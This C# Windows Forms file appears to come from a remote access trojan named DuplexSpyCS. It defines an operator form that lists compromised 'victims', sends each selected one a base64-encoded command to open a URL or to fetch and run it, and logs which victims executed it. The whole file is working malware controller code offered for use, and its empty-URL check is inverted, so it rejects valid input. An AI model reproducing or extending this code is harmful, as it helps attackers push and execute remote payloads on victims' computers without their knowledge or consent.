using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiURL : Form
    {
        private List<clsVictim> m_lsVictim { get; init; }
        private int nCnt = 0;

        public frmMultiURL(List<clsVictim> lsVictim)
        {
            InitializeComponent();

            m_lsVictim = lsVictim;

            StartPosition = FormStartPosition.CenterScreen;
            Text = $"MultiURL[{lsVictim.Count}]";
        }

        void fnRecv(clsListener listener, clsVictim v, List<string> cmd)
        {
            if (!m_lsVictim.Contains(v))
                return;

            if (cmd[0] == "exec")
            {
                if (cmd[1] == "url")
                {
                    if (cmd[2] == "open")
                    {
                        int nCode = int.Parse(cmd[3]);

                        Invoke(new Action(() =>
                        {
                            ListViewItem item = listView1.FindItemWithText(v.ID);
                            if (item == null)
                                return;

                            if (nCode == 0)
                            {
                                item.SubItems[1].Text = "Failed";
                            }
                            else
                            {
                                item.SubItems[1].Text = "Command is executed, please check.";
                            }

                            fnLogs(v, item.SubItems[1].Text);
                        }));
                    }
                    else if (cmd[2] == "run")
                    {
                        string szURL = clsCrypto.b64D2Str(cmd[3]);
                        int nCode = int.Parse(cmd[4]);
                        string szMsg = nCode == 0 ? clsCrypto.b64D2Str(cmd[5]) : "Executed, please checked";

                        fnLogs(v, szMsg);
                    }
                }
            }
        }

        void fnLogs(clsVictim victim, string szMsg)
        {
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText($"[{victim.ID}]: {szMsg}");
                richTextBox1.AppendText(Environment.NewLine);
            }));
        }

        void setup()
        {
            foreach (var v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;
                listView1.Items.Add(item);

                v.m_listener.ReceivedDecoded += fnRecv;
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";
        }

        private void frmMultiURL_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string szURL = textBox1.Text;
            bool bExec = checkBox1.Checked;

            if (!string.IsNullOrEmpty(szURL))
            {
                MessageBox.Show("URL is null or empty.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            List<clsVictim> lsVictim = listView1.CheckedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
            if (lsVictim.Count == 0)
            {
                MessageBox.Show("Please check a item!", "Nothing!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            foreach (var v in lsVictim)
            {
                v.fnSendCommand(new string[]
                {
                    "exec",
                    "url",
                    bExec ? "run" : "open",
                    clsCrypto.b64E2Str(szURL),
                });
            }
        }

        private void frmMultiURL_FormClosed(object sender, FormClosedEventArgs e)
        {
            foreach (var victim in m_lsVictim)
                victim.m_listener.ReceivedDecoded -= fnRecv;
        }

        //Check All
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck All
        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Function\\MultiURL").Show();
        }
    }
}
